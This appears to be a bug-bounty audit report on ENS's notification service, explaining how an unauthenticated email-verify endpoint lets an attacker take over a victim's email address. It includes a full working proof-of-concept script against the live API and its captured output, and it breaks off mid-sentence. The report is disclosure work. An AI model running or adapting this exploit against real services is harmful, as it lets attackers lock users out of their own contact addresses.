# 89891 w a low notifications channels email verify verifies whoever s token you send not whoever asks

**Submitted on Aug 21st 2026 at 17:41:18 UTC by @charaf for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89891
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Changing sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Email

## Description

Pick a person's email address. A handful of POSTs later, that address belongs to an account they do not control. They cannot add it to their own ENS account.. the app tells them "This email address is already linked to another account", and there is no path in the product that gives it back, yet.

`email.ts:172-201` — no `requireAuth`, and the ownership check at `:59-70` is never re-run:

```ts
.post('/verify', vValidator('json', verifyEmailChannelBodySchema), injectDb, async (c) => {
  const { token } = c.req.valid('json')
  const verification = await c.var.db.query.channelVerifications.findFirst({
    where: and(eq(token, token), eq(purpose, 'verify'), gt(expires_at, new Date())) })
  if (!verification) return c.json({ error: 'Invalid or expired verification token' }, 400)
  await c.var.db.update(TABLE.userChannels)
    .set({ status: 'verified', verified_at: new Date() })
    .where(eq(TABLE.userChannels.id, verification.channel_id))   // token picks the row
```

`:59-70` lets anyone claim any unclaimed address, so the token in the victim's inbox is the attacker's. Their click verifies the attacker's row.

The address ends up on an account the owner doesn't control, they can't reclaim it (`400 "This email address is already linked to another account"`, and a third uninvolved wallet gets the same 400 — `_out/evidence/123`), and the one click is on your genuine DKIM-signed mail.

## Not a duplicate

Nothing in the published register (`R2-*`, `R3-*`, `SEC-MGR-*`, `SEC-TXM-*`, `EXP-*`, `QA-*`, `WEB-*`) touches channel ownership or the email-verification lifecycle; the closest, `R2-05`, is the webhook signature — different file, and it fails closed live (`401` unsigned, `401` bogus). Against our own reports on this subsystem: this fix is in `/email/verify`; the lockout's is the rate-limit key; the contact-deletion one is in `DELETE /channels/:id`. **No one of the three closes either of the others.**

## Notes

Both wallets ours; mailbox a throwaway created for the run; every row deleted, both lists back to `[]`. `POST /notifications/channels/email/verify` is the only unauthenticated state-changing route in the subsystem — every other one is `401` without a token (`_out/evidence/125`). The keyless attacker identity comes from a separate `/auth/login` defect reported on its own and is **not load-bearing**:

## Two things that stop "they already verified, so they're safe" from bounding this

* `webhook/sendgrid.ts:185-235` sets a row to `bounced` / `unsubscribed`. Neither is `verified`, so the gate at `:59-70` stops blocking the moment a verified user bounces, unsubscribes, or reports one of your mails as spam — including the attacker's own unsolicited mail from step 1. Code claim: we cannot forge a signed SendGrid event.
* `normalizeEmailForRateLimit` is `trim().toLowerCase()`, so `victim+1@x` and `v.ictim@x` are fresh rows *and* fresh budgets while Gmail delivers all three to the same person. Measured live: `rl-…@example.invalid` → 429, `RL-…@EXAMPLE.INVALID` → 429 (case is folded), `rl-…+1@example.invalid` → 200, `rl-….x@example.invalid` → 200.

Also free and silent, same file: the `400` at `:67` is returned before the upsert and before the limiter, so it is an unlimited oracle for "is this address a verified ENS notifications user". Not claimed separately; noted because the fix is the same guard.

## Proof of Concept

```js
// node this from a dir with {"type":"module"} + node_modules -> repo/apps/portal/node_modules
import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'
const API='https://app-api.ens.dev', Z='0x'.padEnd(42,'0'), MT='https://api.mail.tm'
const j=async r=>{const t=await r.text();try{return JSON.parse(t)}catch{return t}}
const nonce=async()=>(await j(await fetch(`${API}/auth/nonce`,{method:'POST'}))).nonce
const mk=(a,n)=>`app.ens.dev wants you to sign in with your Ethereum account:\n${a}\n\n\nURI: https://app.ens.dev\nVersion: 1\nChain ID: 11155111\nNonce: ${n}\nIssued At: ${new Date().toISOString()}`
const login=async(a,s)=>(await j(await fetch(`${API}/auth/login`,{method:'POST',
  headers:{'content-type':'application/json'},body:JSON.stringify(s)}))).token
async function wallet(){const k=privateKeyToAccount(generatePrivateKey()),n=await nonce(),m=mk(k.address,n)
  return{t:await login(0,{address:k.address,message:m,signature:await k.signMessage({message:m}),nonce:n}),a:k.address}}
async function zero(){const n=await nonce()
  return{t:await login(0,{address:Z,message:mk(Z,n),signature:'0x'+'00'.repeat(32)+'11'.repeat(32)+'1b',nonce:n}),a:Z}}
const H=t=>({authorization:`Bearer ${t}`,'content-type':'application/json'})
const add=(t,e)=>fetch(`${API}/notifications/channels/email`,{method:'POST',headers:H(t),body:JSON.stringify({email:e})})
const list=async t=>j(await fetch(`${API}/notifications/channels`,{headers:H(t)}))

const dom=(await j(await fetch(`${MT}/domains`)))['hydra:member'][0].domain
const addr=`poc-${Date.now()}@${dom}`, pw='Aa1!'+Math.random().toString(36).slice(2,12)
await fetch(`${MT}/accounts`,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({address:addr,password:pw})})
const mt=(await j(await fetch(`${MT}/token`,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({address:addr,password:pw})}))).token
const box=async()=>(await j(await fetch(`${MT}/messages`,{headers:{authorization:`Bearer ${mt}`}})))['hydra:member']||[]
const tok=async id=>{const f=await j(await fetch(`${MT}/messages/${id}`,{headers:{authorization:`Bearer ${mt}`}}))
  return(((f.text||'')+JSON.stringify(f.html||'')).match(/verify\?token=([0-9a-f]{32})/)||[])[1]}
const wait=async n=>{for(let i=0;i<90;i++){const m=await box();if(m.length>=n)return m;await new Promise(r=>setTimeout(r,2000))}return box()}

const A=await zero(), V=await wallet()                       // attacker: keyless. victim: real wallet.
for(let i=0;i<6;i++){const r=await add(A.t,addr);console.log('attacker',r.status);if(r.status===429)break}
console.log('inbox:',(await wait(3)).length,'ENS mails, all the attacker\'s')
console.log('VICTIM add ->',(await add(V.t,addr)).status)   // 429: their own mail is never sent
const m=await box(), T=await tok(m[m.length-1].id)
const r=await fetch(`${API}/notifications/channels/email/verify`,{method:'POST',
  headers:{'content-type':'application/json'},body:JSON.stringify({token:T})})   // no Authorization
console.log('verify ->',r.status,await j(r))
console.log('ATTACKER',JSON.stringify(await list(A.t)))
console.log('VICTIM  ',JSON.stringify(await list(V.t)))
console.log('victim retry ->',JSON.stringify(await j(await add(V.t,addr))))
for(const t of [A.t,V.t]){for(const c of await list(t))await fetch(`${API}/notifications/channels/${c.id}`,{method:'DELETE',headers:H(t)})}
```

Output (`_out/evidence/127-inline-poc-verbatim.log`, this exact script):

```
attacker 200 x5, then 429
inbox: 5 ENS mails, all the attacker's
VICTIM add -> 429                              <- victim's own mail never sent
verify -> 200 {"message":"Email verified successfully"}      <- no Authorization header
ATTACKER [{"id":"01a02511-6fa0…","status":"verified","verified_at":"2026-08-21T16:05:30.633Z","label":"poc-…@emalupe.com"}]
VICTIM   [{"id":"01a02511-d145…","status":"pending","verified_at":null,"label":"poc-…@emalupe.com"}]
victim retry -> {"error":"This email address is already linked to another account"}
```

Control: same script with the drain loop removed → victim enrols and verifies normally, 200. Reproduced 3×: `_out/evidence/124`, `126`, `127`.

The victim's interaction is your own mail → your own `/notifications/channels/email/verify?token=` page → its one **Verify Email Address** button. That page is live on `app.ens.dev` today (200) and
